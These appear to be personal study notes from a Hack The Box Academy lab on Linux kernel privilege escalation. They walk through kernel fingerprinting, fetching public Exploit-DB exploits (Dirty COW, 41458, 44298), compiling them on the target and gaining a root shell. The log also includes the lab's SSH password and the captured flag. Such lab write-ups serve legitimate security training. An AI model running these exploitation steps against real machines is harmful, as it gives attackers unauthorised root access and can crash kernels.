# Kernel Exploits

Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is Dirty COW (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges.

1) Checking the Kernel level and Linux OS version

uname -a
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

2) Google :

Google search for linux 4.4.0-116-generic exploit :
https://vulners.com/zdt/1337DAY-ID-30003

3) Upload the exploit

4) Compile and set the executable bit

gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit

5) Run exploit

./kernel_exploit

whoami
root

## LAB

ssh htb-student@10.129.220.117
Academy_LLPE!

uname -a
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

git clone https://github.com/dirtycow/dirtycow.github.io
scp dirtyc0w.c htb-student@10.129.220.117:/home/htb-student/
gcc dirtyc0w.c -o kernel_exploit && chmod +x kernel_exploit

--> failed

https://www.exploit-db.com/exploits/44298

/usr/share/exploitdb/exploits/linux/local/41458.c

scp /usr/share/exploitdb/exploits/linux/local/41458.c htb-student@10.129.220.117:/home/htb-student/
gcc 41458.c -o kernel_exploit && chmod +x kernel_exploit

./kernel_exploit 
[.] namespace sandbox setup successfully
[.] disabling SMEP & SMAP
[.] scheduling 0xffffffff81064550(0x406e0)
[.] waiting for the timer to execute
[.] done
[.] SMEP & SMAP should be off now
[.] getting root
[.] executing 0x402043
[.] done
[.] should be root now
[.] checking if we got root
[-] something went wrong =(
[!] don't kill the exploit binary, the kernel will crash

searchsploit linux kernel 4.4.0-116

/usr/share/exploitdb/exploits/linux/local/44298.c

scp /usr/share/exploitdb/exploits/linux/local/44298.c htb-student@10.129.220.117:/home/htb-student/
Academy_LLPE!

gcc 44298.c -o 44298 && chmod +x 44298
./44298 

./44298 
task_struct = ffff8800b90a4600
uidptr = ffff88003569c6c4
spawning root shell
root@NIX02:~# 
cat /root/kernel_exploit/flag.txt
46237b8aa523bc7e0365de09c0c0164f